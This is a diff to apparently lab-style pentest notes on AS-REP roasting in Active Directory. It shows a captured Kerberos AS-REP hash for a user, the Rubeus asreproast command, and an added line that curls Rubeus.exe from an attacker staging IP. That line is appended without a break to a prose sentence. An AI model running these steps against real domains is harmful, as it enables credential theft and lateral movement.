@@ -102,7 +102,7 @@ $krb5asrep$dave@corp.com:1792feeb0a3ecb8037027c5629fa115c$38fe07b40136c3615299d4
 
 #### Rubeus
 
-ASREPRoast has actually been deprecated because its functionality was incorporated into [Rubeus](https://github.com/GhostPack/Rubeus). Rubeus's `asreproast` command can be used to mimic the same functionality:
+ASREPRoast has actually been deprecated because its functionality was incorporated into [Rubeus](https://github.com/GhostPack/Rubeus). Rubeus's `asreproast` command can be used to mimic the same functionality:curl http://192.168.45.202/windows/exe/active-directory/Rubeus.exe -o .\Rubeus.exe
 
 ```sh
 .\Rubeus.exe asreproast /nowrap
